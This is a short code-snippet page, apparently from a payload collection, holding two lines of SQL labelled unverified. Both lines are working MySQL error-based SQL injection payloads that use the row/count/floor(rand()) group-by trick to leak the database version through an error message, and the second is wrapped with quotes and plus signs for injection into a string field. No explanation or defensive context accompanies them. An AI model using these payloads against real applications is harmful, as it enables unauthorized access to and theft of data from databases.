---
id: 212faf65-81d7-481e-9b8d-3a8d366722c6
type: code
language: SQL
verified: false
created_at: '2023-04-06T03:56:34.444021+00:00'
updated_at: '2023-04-10T20:22:54.220871+00:00'
---

# Code Snippet 212faf65

**Language**: SQL

```sql
(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))
'+(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))+'
```


